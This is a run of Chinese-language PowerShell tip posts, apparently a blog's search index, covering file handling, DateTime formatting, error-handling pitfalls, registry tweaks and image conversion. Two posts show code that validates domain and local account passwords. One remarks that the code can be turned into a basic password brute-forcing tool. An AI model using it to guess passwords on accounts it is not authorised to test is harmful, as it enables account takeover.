$_.title $_ }# create folder on your desktop$Path = &quot;$home\\Desktop\\CheatSheets&quot;$exists = Test-Path -Path $Pathif (!$exists) { $null = New-Item -Path $path -ItemType Directory }# download cheat sheets$links | ForEach-Object { $docPath = Join-Path -Path $Path -ChildPath $_.Title Start-BitsTransfer -Source $_.href -Destination $docPath -Description $_.title # alternate way of downloading # Invoke-WebRequest -UseBasicParsing -Uri $_.href -OutFile $docPath}# open folderexplorer $Path 当您运行这段脚本时，PowerShell 将下载所有的速查表并且将它们存放在桌面上一个名为 “CheatSheets” 的新文件夹中。祝您读得愉快！","link":"/2019/01/24/powershell-cheat-sheet-compilation-part-2/"},{"title":"PowerShell 技能连载 - 从 Unicode 文件中移除 BOM","text":"BOM（字节顺序标记）是在某些 Unicode 编码的文本文件特有的字节顺序。如果您收到一个包含了 BOM 的文件，而要处理它的其它系统并不支持 BOM，那么以下是如何用 PowerShell 移除这类文件中的 BOM 的方法： 123456function Remove-BomFromFile ($OldPath, $NewPath){ $Content = Get-Content $OldPath -Raw $Utf8NoBomEncoding = New-Object System.Text.UTF8Encoding $False [IO.File]::WriteAllLines($NewPath, $Content, $Utf8NoBomEncoding)} 现在要获取一个文件的 BOM 并将它转为一个无 BOM 的文件就很方便了： 123$Path = &quot;$env:temp\\export.csv&quot;$NewPath = &quot;$env:temp\\export_new.csv&quot;Remove-BomFromFile -OldPath $Path -NewPath $NewPath","link":"/2019/01/25/removing-bom-from-the-unicode-files/"},{"title":"PowerShell 技能连载 - 自动打印到 XPS 文件","text":"XPS 是由 Microsoft 开发的类似 PDF 的文档格式。虽然它并没有大规模使用，但它仍然是一种打印信息到文件的很好的内部格式。要无人值守地打印到 XPS 文件，首先您需要设置一个新的打印机，该打印机将自动打印到一个指定的输出文件： 123456#requires -RunAsAdministrator$OutPath = &quot;$env:temp\\out.xps&quot;$PrinterName = &quot;XPSPrinter&quot;Add-PrinterPort -Name $OutPathAdd-Printer -Name $PrinterName -DriverName 'Microsoft XPS Document Writer v4' -PortName $OutPath 请确保 XPS 查看器已经安装： 12#requires -RunAsAdministratorEnable-WindowsOptionalFeature -Online -FeatureName Xps-Foundation-Xps-Viewer -NoRestart 基于以上的准备工作，现在要将输出结果自动打印到 XPS 文件非常简单。以下是一个日常使用的打印函数： 1234567891011121314151617181920function Out-PrinterXPS ($Path = $(Read-Host -Prompt 'XPS document path to create')){ $PrinterName = &quot;XPSPrinter&quot; $OutPath = &quot;$env:temp\\out.xps&quot; $exists = Test-Path -Path $OutPath if ($exists) { Remove-Item -Path $OutPath } $input | Out-Printer -Name $PrinterName do { Start-Sleep -Milliseconds 500 $exists = Test-Path -Path $OutPath } while (!$exists) Move-Item -Path $OutPath -Destination $Path -Force} 让我们试试使用它！以下是一行在桌面上创建系统清单报告的代码： 12345678# print to this file$Path = &quot;$home\\desktop\\inventar.xps&quot;# pipe the data to the filesysteminfo.exe /FO CSV | ConvertFrom-Csv | Out-PrinterXPS -Path $Path# open the XPS file with the built-in viewerInvoke-Item -Path $Path","link":"/2019/01/28/automatically-printing-to-xps-files/"},{"title":"PowerShell 技能连载 - 将 Windows 服务器转变为工作站","text":"PowerShell 5 及以上版本提供了一个自动添加 Windows 功能的 cmdlet，所以如果您正在运行 Windows Server 并且想使用 Workstation 功能，请以管理员权限打开一个 PowerShell，然后运行以下代码： 1Enable-WindowsOptionalFeature -FeatureName DesktopExperience -All -Online -NoRestart","link":"/2019/01/29/turn-a-windows-server-into-a-workstation/"},{"title":"PowerShell 技能连载 - 在文件管理器中隐藏 OneDrive","text":"是否厌倦了 OneDrive 图表污染了您的文件管理器树形视图？如果您不使用 OneDrive，那么有两个很好用的函数可以在文件管理器里隐藏或显示 OneDrive 图标： 1234567891011121314function Disable-OneDrive{ $regkey1 = 'Registry::HKEY_CLASSES_ROOT\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' $regkey2 = 'Registry::HKEY_CLASSES_ROOT\\Wow6432Node\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' Set-ItemProperty -Path $regkey1, $regkey2 -Name System.IsPinnedToNameSpaceTree -Value 0}function Enable-OneDrive{ $regkey1 = 'Registry::HKEY_CLASSES_ROOT\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' $regkey2 = 'Registry::HKEY_CLASSES_ROOT\\Wow6432Node\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' Set-ItemProperty -Path $regkey1, $regkey2 -Name System.IsPinnedToNameSpaceTree -Value 1}","link":"/2019/01/30/hide-onedrive-from-file-explorer/"},{"title":"PowerShell 技能连载 - 解析 Windows 安装日期","text":"是否关心过您的 Windows 已经安装了多久？一个单行的代码可以告诉您结果： 123PS&gt; (Get-CimInstance -Class Win32_OperatingSystem).InstallDateFreitag, 8. Juni 2018 18:24:46 有两件事值得注意：第一，我们显然在使用德文的系统。第二，安装的日期可能比您想象的更近：每个新的 Windows 10 主版本更新实际上导致了一个完整的重新安装过程。 如果您希望改变 DateTime 输出的语言，只需要使用 ToString() 和一个 CultureInfo 对象： 1234PS&gt; (Get-CimInstance -Class Win32_OperatingSystem).InstallDate.ToString([System.Globalization.CultureInfo]'en-us')6/8/2018 6:24:46 PMPS&gt; 如果您想了解 Windows 安装了多少填，请使用 New-TimeSpan： 123456789101112131415161718192021PS&gt; New-TimeSpan -Start (Get-CimInstance -Class Win32_OperatingSystem).InstallDateDays : 204Hours : 18Minutes : 53Seconds : 52Milliseconds : 313Ticks : 176936323133869TotalDays : 204,787411034571TotalHours : 4914,89786482969TotalMinutes : 294893,871889782TotalSeconds : 17693632,3133869TotalMilliseconds : 17693632313,3869PS&gt; (New-TimeSpan -Start (Get-CimInstance -Class Win32_OperatingSystem).InstallDate).TotalDays204,78764150864PS&gt; (New-TimeSpan -Start (Get-CimInstance -Class Win32_OperatingSystem).InstallDate).Days204","link":"/2019/01/31/extracting-windows-installation-date/"},{"title":"PowerShell 技能连载 - 格式化 DateTime","text":"当您拥有一个真正的 DateTime 对象（比如不是字符串）时，您就拥有了许多强大的格式化功能。您可以直接获取一个 DateTime 对象： 1234PS&gt; $installDate = (Get-CimInstance -Class Win32_OperatingSystem).InstallDatePS&gt; $installDate.GetType().FullNameSystem.DateTime 或者您可以将一个字符串转换为一个 DateTime 对象： 1234PS&gt; $psconf = Get-Date -Date '2019-06-04 09:00'PS&gt; $psconf.GetType().FullNameSystem.DateTime 当您拥有一个 DateTime 对象时，请使用 ToString() 方法并提供一个或两个参数。 第一个参数决定您希望使用日期的哪些部分，并使用这些占位符（大小写敏感！）： y Year M Month d Day H Hour m Minute s Second f Millisecond 指定了越多占位符，就可以得到越多的细节： 12345678910PS&gt; (Get-Date).ToString('dd')30PS&gt; (Get-Date).ToString('ddd')SoPS&gt; (Get-Date).ToString('dddd')SonntagPS&gt; （如您所见，PowerShell 使用的是缺省的语言，这个例子中使用的是德语） 要以 ISO 格式输出一个 DateTime，请使用这段代码： 123456PS&gt; $installDate = (Get-CimInstance -Class Win32_OperatingSystem).InstallDatePS&gt; $installDate.ToString('yyyy-MM-dd HH:mm:ss')2018-06-08 18:24:46PS&gt; 如果您也希望指定区域设置（语言），请在第二个参数指定 CultureInfo： 12345678910111213PS&gt; (Get-Date).ToString('dddd', [System.Globalization.CultureInfo]'en-us')SundayPS&gt; (Get-Date).ToString('dddd', [System.Globalization.CultureInfo]'zh')星期日PS&gt; (Get-Date).ToString('dddd', [System.Globalization.CultureInfo]'es')domingoPS&gt; (Get-Date).ToString('dddd', [System.Globalization.CultureInfo]'fr')dimanchePS&gt; 如果您想了解某个区域设置的区域代码，请试试这段代码： 1PS&gt; [System.Globalization.CultureInfo]::GetCultures('Installed') | Out-GridView -PassThru","link":"/2019/02/01/formatting-a-datetime/"},{"title":"PowerShell 技能连载 - 计算一个月的第一天和最后一天","text":"对于报表以及类似的场景，脚本可能需要获得指定月份的第一天和最后一天。第一天很简单，但最后一天依赖于月份和年份。以下是一个简单的计算器。只需要指定您需要的月份和年份： 123456789101112131415[ValidateRange(1,12)][int]$month = 3$year = 2019$last = [DateTime]::DaysInMonth($year, $month)$first = Get-Date -Day 1 -Month $month -Year $year -Hour 0 -Minute 0 -Second 0$last = Get-Date -Day $last -Month $month -Year $year -Hour 23 -Minute 59 -Second 59PS&gt; $first3/1/2019 12:00:00 AMPS&gt; $last3/31/2019 11:59:59 PMPS&gt;","link":"/2019/02/04/calculating-first-and-last-day-of-month/"},{"title":"PowerShell 技能连载 - “危险的”比较","text":"假设您希望排除某个数组中所有为空字符串或者 null 元素。以下是许多人可能的做法： 12345678PS&gt; 1,2,$null,&quot;test&quot;,&quot;&quot;,9 | Where-Object { $_ -ne '' -and $_ -ne $null }12test9PS&gt; 然而，这个对比是危险的，因为它也排除了数值 0: 12345678PS&gt; 1,2,0,$null,&quot;test&quot;,&quot;&quot;,0,9 | Where-Object { $_ -ne '' -and $_ -ne $null }12test9PS&gt; PowerShell 过滤掉了数值 0，因为它等同于一个空字符串： 12345PS&gt; 0 -eq ''TruePS&gt; 1 -eq ''False 这是因为在比较时，以等号左侧的数据类型为准，而由于左侧是一个 integer 值，所以 PowerShell 将空字符串也转换成一个 integer，而转换的结果值是 0。 为了安全地进行比较，请记住一定将相关的数据类型放在等号左侧，而不是右侧： 12345678910PS&gt; 1,2,0,$null,&quot;test&quot;,&quot;&quot;,0,9 | Where-Object { '' -ne $_ -and $null -ne $_ }120test09PS&gt; 或者更好一点，使用 API 函数来确认空值： 12345678910PS&gt; 1,2,0,$null,&quot;test&quot;,&quot;&quot;,0,9 | Where-Object { ![string]::IsNullOrWhiteSpace($_) }120test09PS&gt;","link":"/2019/02/05/dangerous-comparisons/"},{"title":"PowerShell 技能连载 - 移除空的数组元素（第 1 部分）","text":"有些时候您会遇到包含空元素的列表（数组）。那么移除空元素的最佳方法是？ 让我们首先关注一个普遍的场景：以下代码从注册表读取已安装的软件并创建一个软件清单。该软件清单将显示在一个网格视图窗口中，而很可能能看到包含空属性的元素： 123456789$Paths = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKCU:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'$software = Get-ItemProperty -Path $paths -ErrorAction Ignore | Select-Object -Property DisplayName, DisplayVersion, UninstallString$software | Out-GridView 让我们忽略所有显示名称为空的元素： 12# remove elements with empty DisplayName property$software = $software | Where-Object { [string]::IsNullOrWhiteSpace($_.DisplayName)} 由于空属性既包含“真正”为空 ($null) 也包含空字符串 ('')，您需要检查它们两者。更简单的方法是将它们隐式转换为 Boolean。然而，这样做仍然会移除数值 0: 12# remove elements with empty DisplayName property$software = $software | Where-Object { $_.DisplayName } 使用 PowerShell 3 引入的简化语法，您甚至可以这样写： 12# remove elements with empty DisplayName property$software = $software | Where-Object DisplayName 如果你想节省几毫秒，请使用 where 方法： 12# remove elements with empty DisplayName property$software = $software.Where{ $_.DisplayName } 如果您想处理一个大数组，用 foreach 循环更有效（效率提升 15 倍）： 12# remove elements with empty DisplayName property$software = foreach ($_ in $software){ if($_.DisplayName) { $_ }}","link":"/2019/02/06/removing-empty-array-elements-part-1/"},{"title":"PowerShell 技能连载 - 移除空的数组元素（第 2 部分）","text":"如果您想彻底移除空的数组元素（而不需要关心任何空属性），以下是一些性能根本不同的几种实现： 12345678910111213# create huge array with empty elements$array = 1,2,3,$null,5,0,3,1,$null,'',3,0,1$array = $array * 1000# &quot;traditional&quot; approach (6 sec)Measure-Command { $newArray2 = $array | Where-Object { ![string]::IsNullOrWhiteSpace($_) }}# smart approach (0.03 sec)Measure-Command { $newArray3 = foreach ($_ in $array) { if (![String]::IsNullOrWhiteSpace($_)){ $_} }}","link":"/2019/02/07/removing-empty-array-elements-part-2/"},{"title":"PowerShell 技能连载 - 在资源管理器中启用预览 PowerShell 文件","text":"当您在 Windows 的资源管理器中打开预览窗格查看 PowerShell 脚本时，缺省情况下看不到脚本文件的代码预览。预览窗格是空白的。 要启用预览，只需要使用以下函数： 1234567891011121314151617181920212223242526272829303132333435363738function Enable-PowerShellFilePreview{ [CmdletBinding()] param ( [string] $Font = 'Courier New', [int] $FontSize = 60 ) # set the font and size (also applies to Notepad) $path = &quot;HKCU:\\Software\\Microsoft\\Notepad&quot; Set-ItemProperty -Path $path -Name lfFaceName -Value $Font Set-ItemProperty -Path $path -Name iPointSize -Value $FontSize # enable the preview of PowerShell files $path = 'HKCU:\\Software\\Classes\\.ps1' $exists = Test-Path -Path $path if (!$exists){ $null = New-Item -Path $Path } $path = 'HKCU:\\Software\\Classes\\.psd1' $exists = Test-Path -Path $path if (!$exists){ $null = New-Item -Path $Path } $path = 'HKCU:\\Software\\Classes\\.psm1' $exists = Test-Path -Path $path if (!$exists){ $null = New-Item -Path $Path } Get-Item HKCU:\\Software\\Classes\\* -Include .ps1,.psm1,.psd1 | Set-ItemProperty -Name PerceivedType -Value text} 运行这个函数后，使用这个命令： 1PS&gt; Enable-PowerShellFilePreview 如果您喜欢的话，还可以改变预览的字体系列和字号。请注意该设置和记事本共享： 1PS&gt; Enable-PowerShellFilePreview -Font Consolas -FontSize 100 不需要重启系统就可以生效。只需要确保 Windows 资源管理器的预览窗格可见，并选取一个 PowerShell 文件。","link":"/2019/02/08/enabling-preview-of-powershell-files-in-windows-explorer/"},{"title":"PowerShell 技能连载 - 读取新闻订阅","text":"以下是一个针对有德语技能的用户的特殊服务——对于其他人修改代码会有所挑战：以下代码使用了德国主要新闻杂志的 RSS 订阅，打开一个选择窗口。在窗口中您可以选择一篇或多篇文章，然后在缺省的浏览器中打开选择的文章： 123456789101112131415# URL to RSS Feed$url = 'http://www.spiegel.de/schlagzeilen/index.rss'$xml = New-Object -TypeName XML$xml.Load($url)# the subproperties (rss.channel.item) depend on the RSS feed you use# and may be named differently$xml.rss.channel.item | Select-Object -Property title, link | Out-GridView -Title 'What would you like to read today?' -OutputMode Multiple | ForEach-Object { Start-Process $_.link } 基本的设计过程是一致的：要将代码改为另一个 RSS 订阅，只需要导航到相应的属性（背后的 XML 的嵌套结构）。","link":"/2019/02/11/reading-news-feeds/"},{"title":"PowerShell 技能连载 - 小心“Throw”语句（第 1 部分）","text":"throw 是一个 PowerShell 语句，会抛出一个异常到调用者，并退出代码。至少理论上是这样。实际中，throw 可能不会退出代码，而且结果可能是毁灭性的。 要理解这个问题，请查看这个演示函数： 123456789function Copy-Log{ &quot;Doing prerequisites&quot; &quot;Testing whether target path exists&quot; &quot;If target path does not exist, bail out&quot; throw &quot;Target path does not exist&quot; &quot;Copy log files to target path&quot; &quot;Delete log files in original location&quot;} 当您运行 Copy-Log 时，它模拟了一个失败情况，假设一个目标路径不存在。当目标路径不存在时，不能复制日志文件。如果日志文件没有复制，那么不能删除它们。这是为什么调用 throw 时代码需要退出得原因。而且它确实有效： 12345678910111213PS&gt; Copy-LogDoing prerequisitesTesting whether target path existsIf target path does not exist, bail outTarget path does not existIn Zeile:8 Zeichen:3+ throw &quot;Target path does not exist&quot;+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (Target path does not exist:String) [], RuntimeExceptio n + FullyQualifiedErrorId : Target path does not existPS&gt; 然而，这是基于 $ErrorActionPreference 为缺省值 “Continue” 时的行为。当一个用户恰好将它改为 “SilentlyContinue” 来禁止错误信息时，throw 会被彻底忽略，而且所有代码将会执行： 12345678PS&gt; $ErrorActionPreference = 'SilentlyContinue'PS&gt; Copy-LogDoing prerequisitesTesting whether target path existsIf target path does not exist, bail outCopy log files to target pathDelete log files in original location 在这个场景中，您可能会丢失所有日志文件，因为复制操作没有生效，而代码继续执行并删除了原始文件。 重要的知识点： 如果退出函数对您来说很重要，throw 可能并不会真正地退出函数。您可能需要用其他方法来退出代码，例如 return 语句。","link":"/2019/02/12/be-careful-with-throw-statements-part-1/"},{"title":"PowerShell 技能连载 - 小心“Throw”语句（第 2 部分）","text":"在前一个技能中我们解释了将 $ErrorActionPreference 设为 “SilentlyContinue” 将如何影响 throw 语句，而且该 throw 将不会正常地退出函数代码。以下还是我们使用过的例子： 123456789101112131415161718192021222324252627282930313233function Copy-Log{ &quot;Doing prerequisites&quot; &quot;Testing whether target path exists&quot; &quot;If target path does not exist, bail out&quot; throw &quot;Target path does not exist&quot; &quot;Copy log files to target path&quot; &quot;Delete log files in original location&quot;}PS&gt; Copy-LogDoing prerequisitesTesting whether target path existsIf target path does not exist, bail outTarget path does not existIn Zeile:8 Zeichen:3+ throw &quot;Target path does not exist&quot;+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (Target path does not exist:String) [], RuntimeExceptio n + FullyQualifiedErrorId : Target path does not existPS&gt; $ErrorActionPreference = 'SilentlyContinue'PS&gt; Copy-LogDoing prerequisitesTesting whether target path existsIf target path does not exist, bail outCopy log files to target pathDelete log files in original location 虽然 ErrorAction 为默认值时，throw 语句能够退出函数，但是当 ErrorAction 设为 “SilentlyContinue” 时代码将继续执行。这很可能是一个 bug，因为 ErrorAction 的值设为 “Continue” 和 “SilentlyContinue” 的唯一区别只应该是错误信息可见与否。这些设置不应该影响实际执行的代码。 这个 throw 中的 bug 只发生在 throw 抛出的终止错误没有被处理的时候。当您使用 try..catch 语句或者甚至添加一个简单的（完全为空的）trap 语句时，一切都正确了，throw 能够像预期地工作了： 1234567# add a trap to fixtrap {}$ErrorActionPreference = &quot;SilentlyContinue&quot;Copy-Log$ErrorActionPreference = &quot;Continue&quot;Copy-Log 一旦添加了捕获语句，这段代码将会在 throw 语句处跳出，无论 $ErrorActionPreference 的设置为什么。您可以在 PowerShell 用户设置脚本中添加一个空白的捕获语句来防止这个 bug，或者重新考虑是否使用 throw 语句。 重要的知识点： throw 是错误处理系统的一部分，通过 throw 抛出的异常需要用 try..catch 或者 trap 语句。如果异常没有捕获，throw 的工作方式可能和预期的不一致。 因为存在这个问题，所以对于暴露给最终用户的函数，不要用 throw 来退出函数代码。对于最终用户，与其抛出一个（丑陋的）异常，还不如用 Write-Warning 或 Write-Host 抛出一条对人类友好的错误信息，然后用 return 语句友好地退出代码。 如果您必须抛出一个异常，以便调用者能够在他们的错误处理器中捕获它，但也需要确保无论 $ErrorActionPreference 为何值都能可靠地退出代码，请使用 Write-Error 和 return 语句的组合： 123456789function Copy-Log{ &quot;Doing prerequisites&quot; &quot;Testing whether target path exists&quot; &quot;If target path does not exist, bail out&quot; Write-Error &quot;Target path does not exist&quot;; return &quot;Copy log files to target path&quot; &quot;Delete log files in original location&quot;} 由于 return 语句不受 $ErrorActionPreference 的影响，您的代码总是能够退出。让我们做个测试： 12345678910PS&gt; Copy-LogDoing prerequisitesTesting whether target path existsIf target path does not exist, bail outCopy-Log : Target path does not existIn Zeile:1 Zeichen:1+ Copy-Log+ ~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Write-Error], WriteErrorException + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Copy-Log 如果将 $ErrorActionPreference 设为 SilentlyContinue，错误信息和预期一致地被屏蔽了，但是代码确实退出了： 123456PS&gt; $ErrorActionPreference = 'SilentlyContinue'PS&gt; Copy-LogDoing prerequisitesTesting whether target path existsIf target path does not exist, bail out","link":"/2019/02/13/be-careful-with-throw-statements-part-2/"},{"title":"PowerShell 技能连载 - 转换 IEEE754 (Float)（第 1 部分）","text":"PowerShell 是非常多功能的，并且现在常常用于 IoT 和传感器。一些 IEEE754 浮点格式往往是一系列四字节的十六进制数。 我们假设一个传感器以 IEEE754 格式返回一个十六进制的数值 3FA8FE3B。那么要如何获取真实值呢？ 技术上，您需要颠倒字节顺序，然后用 BitConverter 来创建一个 “Single” 值。 以 3FA8FE3B 为例，将它逐对分割，颠倒顺序，然后转换为一个数字： 12$bytes = 0x3B, 0xFE, 0xA8, 0x3F[BitConverter]::ToSingle($bytes, 0) 实际结果是，十六进制数值 0x3FA8FE3B 返回了传感器值 1.320258。今天，我们研究 BitConverter 类，这个类提供了多个将字节数组转换为数值的方法。明天，我们将查看另一部分：将十六进制文本数值成对分割并颠倒顺序。 今日的知识点： 使用 [BitConverter] 来将原始字节数组转换为其它数字格式。这个类有大量方法： 12345678910111213141516171819PS&gt; [BitConverter] | Get-Member -Static | Select-Object -ExpandProperty NameDoubleToInt64BitsEqualsGetBytesInt64BitsToDoubleIsLittleEndianReferenceEqualsToBooleanToCharToDoubleToInt16ToInt32ToInt64ToSingleToStringToUInt16ToUInt32ToUInt64 要查看其中某个方法的语法，请键入它们的名称，不包括圆括号： 12345PS&gt; [BitConverter]::ToUInt32OverloadDefinitions-------------------static uint32 ToUInt32(byte[] value, int startIndex)","link":"/2019/02/14/converting-ieee754-float-part-1/"},{"title":"PowerShell 技能连载 - 转换 IEEE754 (Float)（第 2 部分）","text":"昨天我们研究了用 PowerShell 如何将传感器返回的 IEEE754 浮点值转换为实际值。这需要颠倒字节顺序并使用 BitConverter 类。 如果您收到了一个十六进制的 IEEE754 值，例如 0x3FA8FE3B，第一个任务就是将十六进制值分割为四个字节。实现这个目标简单得让人惊讶：将该十六进制值视为一个 IPv4 地址。这些地址内部也是使用四个字节。 以下是一个快速且简单的方法，能够将传感器的十六进制数值转换为一个有用的数值： 123456$hexInput = 0x3FA8FE3B$bytes = ([Net.IPAddress]$hexInput).GetAddressBytes()$numericValue = [BitConverter]::ToSingle($bytes, 0)&quot;Sensor: $numericValue&quot; 今日的知识点： 将数值转换为 IPAddress 对象来将数值分割为字节。这种方法也可以用来得到一个数字的最低有效位 (LSB) 或最高有效位 (MSB) 形式。","link":"/2019/02/15/converting-ieee754-float-part-2/"},{"title":"PowerShell 技能连载 - 将文本转为图像","text":"WPF (Windows Presentation Foundation) 不仅仅是创建 UI 的技术。您可以用它来创建任意类型的矢量图并将它保存为图形文件。 以下是一个简单的例子，输入任意的文字和字体，然后将它渲染为一个 PNG 文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667function Convert-TextToImage{ param ( [String] [Parameter(Mandatory)] $Text, [String] $Font = 'Consolas', [ValidateRange(5,400)] [Int] $FontSize = 24, [System.Windows.Media.Brush] $Foreground = [System.Windows.Media.Brushes]::Black, [System.Windows.Media.Brush] $Background = [System.Windows.Media.Brushes]::White ) $filename = &quot;$env:temp\\$(Get-Random).png&quot; # take a simple XAML template with some text $xaml = @&quot;&lt;TextBlock xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;&gt;$Text&lt;/TextBlock&gt;&quot;@ Add-Type -AssemblyName PresentationFramework # turn it into a UIElement $reader = [XML.XMLReader]::Create([IO.StringReader]$XAML) $result = [Windows.Markup.XAMLReader]::Load($reader) # refine its properties $result.FontFamily = $Font $result.FontSize = $FontSize $result.Foreground = $Foreground $result.Background = $Background # render it in memory to the desired size $result.Measure([System.Windows.Size]::new([Double]::PositiveInfinity, [Double]::PositiveInfinity)) $result.Arrange([System.Windows.Rect]::new($result.DesiredSize)) $result.UpdateLayout() # write it to a bitmap and save it as PNG $render = [System.Windows.Media.Imaging.RenderTargetBitmap]::new($result.ActualWidth, $result.ActualHeight, 96, 96, [System.Windows.Media.PixelFormats]::Default) $render.Render($result) Start-Sleep -Seconds 1 $encoder = [System.Windows.Media.Imaging.PngBitmapEncoder]::new() $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($render)) $filestream = [System.IO.FileStream]::new($filename, [System.IO.FileMode]::Create) $encoder.Save($filestream) # clean up $reader.Close() $reader.Dispose() $filestream.Close() $filestream.Dispose() # return the file name for the generated image $filename} 以下是使用方法： 123PS&gt; $file = Convert-TextToImage -Text 'Red Alert!' -Font Stencil -FontSize 60 -Foreground Red -Background GrayPS&gt; Invoke-Item -Path $file 今日的知识点： 通过 XAML，一个基于 XML 的 UI 描述语言，您可以定义图像。 PowerShell 可以使用 [Windows.Markup.XAMLReader] 类来快速地将任意合法的 XAML 转换为一个 UIElement 对象。 UIElement 对象可以保存成图形文件，例如 PNG 图像，可以在窗口中显示，或者打印出来。在这个例子中，我们主要是将它保存为文件，然后我们用了一个非常简单的 XAML 定义。您现在可能会感到很好奇。通过 Google 搜索一下这个例子中的方法，您将会找到很多知识。","link":"/2019/02/18/converting-text-to-image/"},{"title":"PowerShell 技能连载 - 等待服务状态变化","text":"当您启动或停止一个服务时，可能需要一些时间才能确保服务进入指定的状态——或者它当然可能会失败。当您使用 Stop-Service 时，PowerShell 将等待该服务状态已确认。如果您希望获得其它地方初始化的服务响应，以下是一段监听代码，它将会暂停 PowerShell 直到服务变为指定的状态： 12345678910111213# wait 5 seconds for spooler service to stop$serviceToMonitor = Get-Service -Name Spooler$desiredStatus = [System.ServiceProcess.ServiceControllerStatus]::Stopped$maxTimeout = New-TimeSpan -Seconds 5try{ $serviceToMonitor.WaitForStatus($desiredStatus, $maxTimeout)}catch [System.ServiceProcess.TimeoutException]{ Write-Warning 'Service did not reach desired status within timeframe.'} 您可以使用这段代码来响应由外部系统触发的服务改变，或者当您要求服务状态更改后做二次确认。 今日的知识点： 您从 cmdlet 获得的多数对象（例如 Get-Service）有许多有用的方法。所有服务对象都有一个 WaitForStatus 方法。在我们的例子中演示了如何使用它。 要发现隐藏在对象中的其它方法，请使用以下代码： 12345# get some object$objects = Get-Process# dump the methods$objects | Get-Member -MemberType *method* | Select-Object -Property Name, Definition","link":"/2019/02/19/waiting-for-a-service-status-change/"},{"title":"PowerShell 技能连载 - 校验域账户密码","text":"PowerShell 可以轻松地校验一个域账号的密码。换句话说，您可以为 Active Directory 维护的密码绑定一个脚本逻辑。 以下是将密码发送到 AD 并获取回一个 Boolean 值的代码：如果密码正确，返回 $true，否则返回 $false： 12345678910# specify user name and user domain$UserDomain = $env:USERDOMAIN$UserName = $env:USERNAME$Password = Read-Host -Prompt &quot;Enter password to test&quot;# test passwordAdd-Type -AssemblyName System.DirectoryServices.AccountManagement$ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain$PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)$PrincipalContext.ValidateCredentials($UserName,$Password) 请注意这段代码需要 Active Directory 环境，并且不支持本地账号。缺省情况下，它使用您当前账号的详细信息。请根据实际情况调整 $UserDomain、$UserName 和 $Password 变量。也请注意 ValidateCredentials() 检查的是明文字符串密码。请谨慎处理并且不要在脚本存储明文密码。同时，不要要求用户以明文输入密码。 今日知识点： PowerShell 可以轻松地连接到 Active Directory 并进行密码验证。","link":"/2019/02/20/verifying-domain-account-passwords/"},{"title":"PowerShell 技能连载 - 验证本地用户账户密码","text":"在前一个技能VS，我们通过 Active Directory 来验证用户账户密码。同样的，对于本地账户也可以。PowerShell 代码可以使用本地账户密码来管理对脚本的存取，或部分限制脚本的功能。当然，您也可以用以下代码来创建自己的基本的密码穷举工具。 缺省情况下，以下代码使用您当前的用户名。请确保 $UserName 是某个本地账户的用户名： 123456789# specify local user name and password to test$UserName = $env:USERNAME$Password = Read-Host -Prompt &quot;Enter password to test&quot;# test passwordAdd-Type -AssemblyName System.DirectoryServices.AccountManagement$type = [DirectoryServices.AccountManagement.ContextType]::Machine$PrincipalContext = [DirectoryServices.AccountManagement.PrincipalContext]::new($type)$PrincipalContext.ValidateCredentials($UserName,$Password) 今日的知识点： PowerShell 可以请求本地的 Windows 用户数据库来验证密码。通过这种方式，您可以使用 Windows 维护的密码来决定一个脚本是否允许执行，或允许某个用户执行哪一部分。 请注意向用户询问密码是一种不安全的做法，因为他们不知道密码将会被用在什么地方。","link":"/2019/02/21/verifying-local-user-account-passwords/"},{"title":"PowerShell 技能连载 - 创建 ASCII 艺术","text":"PowerShell 的功能令人惊叹：只需要几行代码，就可以将任意照片和图片转化为一段 ASCII 艺术。PowerShell 只需要加载图片，然后然后逐行逐列扫描它，然后基于每个像素的亮度将每个像素替换为一个 ASCII 字符。 以下是该函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 function Convert-ImageToAsciiArt{ param( [Parameter(Mandatory)][String] $Path, [ValidateRange(20,20000)] [int]$MaxWidth=80, # character height:width ratio [float]$ratio = 1.5 ) # load drawing functionality Add-Type -AssemblyName System.Drawing # characters from dark to light $characters = '$#H&amp;@*+;:-,. '.ToCharArray() $c = $characters.count # load image and get image size $image = [Drawing.Image]::FromFile($path) [int]$maxheight = $image.Height / ($image.Width / $maxwidth)/ $ratio # paint image on a bitmap with the desired size $bitmap = new-object Drawing.Bitmap($image,$maxwidth,$maxheight) # use a string builder to store the characters [System.Text.StringBuilder]$sb = &quot;&quot; # take each pixel line... for ([int]$y=0; $y -lt $bitmap.Height; $y++){ # take each pixel column... for ([int]$x=0; $x -lt $bitmap.Width; $x++){ # examine pixel $color = $bitmap.GetPixel($x,$y) $brightness = $color.GetBrightness() # choose the character that best matches the # pixel brightness [int]$offset = [Math]::Floor($brightness*$c) $ch = $characters[$offset] if (-not $ch){ $ch = $characters[-1] } # add character to line $null = $sb.Append($ch) } # add a new line $null = $sb.AppendLine() } # clean up and return string $image.Dispose() $sb.ToString()} 以下是它的使用方法： 12345678$Path = &quot;C:\\Users\\Tobias\\Desktop\\Somepic.jpg&quot;$OutPath = &quot;$env:temp\\asciiart.txt&quot;Convert-ImageToAsciiArt -Path $Path -MaxWidth 150 | Set-Content -Path $OutPath -Encoding UTF8Invoke-Item -Path $OutPath 